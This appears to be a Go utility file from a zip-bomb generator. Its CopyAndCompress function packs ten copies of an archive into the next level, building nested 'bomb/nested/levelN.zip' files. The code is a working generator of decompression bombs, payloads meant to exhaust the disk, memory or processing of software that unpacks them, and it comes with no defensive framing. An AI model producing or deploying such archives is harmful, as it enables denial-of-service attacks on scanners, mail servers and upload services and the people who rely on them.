package utils

import (
	"archive/zip"
	"fmt"
	"io"
	"io/ioutil"
	"os"
)

func ZipFiles(filename string, file string) error {
	newZipFile, err := os.Create(filename)
	Check(err)
	defer newZipFile.Close()

	zipWriter := zip.NewWriter(newZipFile)
	defer zipWriter.Close()

	err = AddFileToZip(zipWriter, file)
	os.Remove(file)
	return err
}

func AddFileToZip(zipWriter *zip.Writer, filename string) error {
	fileToZip, err := os.Open(filename)
	Check(err)
	defer fileToZip.Close()

	info, err := fileToZip.Stat()
	Check(err)

	header, err := zip.FileInfoHeader(info)
	Check(err)

	header.Name = filename

	header.Method = zip.Deflate
	writer, err := zipWriter.CreateHeader(header)
	Check(err)
	_, err = io.Copy(writer, fileToZip)
	return err
}

func CopyAndCompress(file string, count int) error {
	newZipName := fmt.Sprintf("bomb/nested/level%d.zip", count+1)
	newZipFile, err := os.Create(newZipName)
	Check(err)
	defer newZipFile.Close()
	zipWriter := zip.NewWriter(newZipFile)
	defer zipWriter.Close()
	bytesRead, err := ioutil.ReadFile(file)
	Check(err)
	for i := 1; i <= 10; i++ {
		zipName := fmt.Sprintf("bomb/nested/%d.zip", i)
		err = ioutil.WriteFile(zipName, bytesRead, 0755)
		Check(err)
		err = AddFileToZip(zipWriter, zipName)
		Check(err)
		os.Remove(zipName)
	}
	os.Remove(file)
	return nil
}
